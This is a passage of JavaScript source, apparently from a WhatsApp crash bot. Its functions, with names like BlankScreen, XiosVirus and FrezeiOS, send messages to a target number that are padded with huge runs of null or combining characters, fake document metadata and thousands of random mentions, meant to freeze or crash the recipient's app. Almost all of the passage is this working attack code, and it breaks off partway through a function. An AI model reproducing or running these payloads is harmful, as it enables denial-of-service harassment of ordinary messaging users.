            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
    
    
    async function FloodsCarousel2(target, Ptcp = true) {
      const header = proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia(
          { image: { url: "https://files.catbox.moe/uk38k6.jpg" } },
          { upload: bad.waUploadToServer }
        )),
        title: "𝙑𝙞𝙣𝙘𝙚𝙣𝙩 𝗖𝗿𝗮𝘀𝗵𝗲𝗿𓍯𓂃" + "\u0000".repeat(100000),
        subtitle: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟",
        hasMediaAttachment: true,
      });

      const body = {
        text: "\u0000" + "\u0000".repeat(90000),
      };

      // Example carousel content
      const carouselMessage = {
        sections: [
          {
            title: " ⃟⃟⃟⃟l𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟ ",
            rows: [
              {
                title: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5𓍯𓂃",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " 𓍯𓂃 ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
          {
            title: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5𓍯𓂃",
            rows: [
              {
                title: "⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟⃟",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
        ],
      };

      await bad.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
                quoted: NullNihBos
              },
            }
          : {}
      );
    }
    
    async function Mym(target, Ptcp = false) {
      await bad.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟" + "\u0000".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "⃟⃟⃟⃟⃟⃟⃟⃟𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟⃟" + "\u0000".repeat(50000),
                body: "⃟⃟⃟⃟⃟⃟𓆩𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5𓆪˖⃟⃟⃟⃟⃟⃟" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/RenXiter",
                mediaUrl: "https://t.me/RemXiter",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/RenXiter",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
  async function XiosVirus(target) {
      bad.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟-` + "࣯\u0000".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟⃟⃟-" + "\u0000".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
            quoted: NullNihBos
          },
        },
        {
          messageId: null,
        }
      );
    }

      async function BlankScreen(target, Ptcp = false) {
        let virtex = "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈𝐘𝐨𝐮 𝐈𝐬 𝐄𝐧𝐞𝐦𝐲" + "\u0000".repeat(90000);
			await bad.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "ZynXzo New",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : { quoted: NullNihBos }
			);
       }
       
async function ComBox(target) {
      {
        await XiosVirus(target);
        await Mym(target, Ptcp = true);
        await FloodsCarousel2(target, Ptcp = true);
        await BlankScreen(target, Ptcp = true);
      }
    }

    async function FrezeiOS(target) {
      {
        await XiosVirus(target)
        await FloodsCarousel2(target, Ptcp = true)
        await Mym(target, Ptcp = true)
      }
    }
    
    
    
    
async function whatsappoffcbjirrrr(target, Ptcp = true) {
      await bad.relayMessage(
        target,
        {
          extendedTextMessage: {
            text:
              "⿻𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈 S͜͡u͜͡p͜͡e͜͡r͜͡M͜͡a͜͡d͜͡e͜͡I͜͡n͜͡H͜͡e͜͡a͜͡v͜͡e͜͡n͜͜͡͡\n" +
              "ꦾ".repeat(99999),
            contextInfo: {
              mentionedJid: [
                "6283187035090@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 18000,
                  },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: " X ",
              conversionData:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              conversionDelaySeconds: 10,
              forwardingScore: 9999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: " X ",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: " X ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "⿻ M͜͡a͜͡d͜͡e͜͡ I͜͡n͜͡ H͜͡e͜͡a͜͡v͜͡e͜͡n͜͡",
                body: "⿻ S͜͡u͜͡p͜͡p͜͡e͜͡r͜͡P͜͡u͜͡c͜͡c͜͡i͜͜͡͡",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewType: "VIDEO",
                thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://whatsapp.com/channel/",
                mediaUrl: "https://whatsapp.com/channel/",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://whatsapp.com/channel/",
              },
              groupSubject: " X ",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: " X ",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: " X ",
                utmCampaign: " X ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " X ",
                contentType: "UPDATE",
                accessibilityText: " X ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

    async function badk(target, ptcp = true) {
      await bad.relayMessage(target, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "M̨̫̲͓̻͚̤̫͜Λ̮͈̜̠̮͖̦̱̟̅͒ͤ̔͂͐͟D̷̯̠̮͚͕̫̭̓ͤ̾̃̽͐̍Λ͉̻̲͓̜̰̟̇ͯ͞ͅ͏Ŕ̨̛̹̼̙͈͖̯̣̞͓̟̅Λ̸̖͇̠͇̺͇̔ͭ̽͑͠Ŧ̵͚Ŕ͍̻̪̲̠̖͕̜ͩ͊ͮ̀͐́̏ΛS̤̮̳͓̱̄ͮ̾̕͟Ḥ̢̭̺͕̟̤͍̂̒ͤ͗̈́ͭ͑̚ͅ" + "ꦾ".repeat(99999)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: " avocado "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: target
        }
      }, {
        messageId: null
      });
    }
    
    

async function uilokas(target, ptcp = true) {
    await bad.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Pucci" + "ꦾ".repeat(999999)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " VoC " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}



async function deadline(target, ptcp = true) {
    await bad.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈̷̪̰ͩ͆ͅȘ̖̙̱̮̌͜͡" + "@1".repeat(295000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " VoC " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}



async function whatsappoffcbjir(target, Ptcp = true) {
    const mentionedJid = [
        "0@s.whatsapp.net", 
        ...Array.from({ length: 5000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];

    const contextInfo = {
        mentionedJid, stanzaId: "1234567890ABCDEF", participant: "0@s.whatsapp.net",
        quotedMessage: { callLogMesssage: { isVideo: true, callOutcome: "1", durationSecs: "0", callType: "REGULAR",
            participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }] } },
        remoteJid: target, forwardingScore: 9999999, isForwarded: true,
        externalAdReply: { title: "", body: "", mediaType: "VIDEO", renderLargerThumbnail: true,
